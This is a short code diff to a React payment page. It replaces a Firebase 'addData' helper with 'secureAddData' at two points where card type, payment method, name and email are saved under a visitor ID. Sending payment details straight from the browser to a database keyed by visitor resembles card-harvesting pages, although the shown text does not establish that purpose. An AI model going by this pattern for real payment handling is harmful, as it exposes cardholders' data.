@@ -9,7 +9,8 @@ import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ShieldCheck, CreditCard, Lock } from "lucide-react"
 import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo, luhnCheck } from "@/lib/card-utils"
-import { addData, db } from "@/lib/firebase"
+import { db } from "@/lib/firebase"
+import { secureAddData } from "@/lib/secure-firebase"
 import { doc, onSnapshot, updateDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { FullPageLoader } from "./loader"
@@ -247,7 +248,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
       
-      const docId = await addData({
+      await secureAddData({
         id: visitorID,
         paymentMethod: selectedPaymentMethod,
         cardType,
@@ -304,7 +305,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       const visitorID = localStorage.getItem("visitor") || "visitor_" + Date.now()
       
       // Save to Firebase or send email
-      await addData({
+      await secureAddData({
         id: visitorID,
         name,
         email,
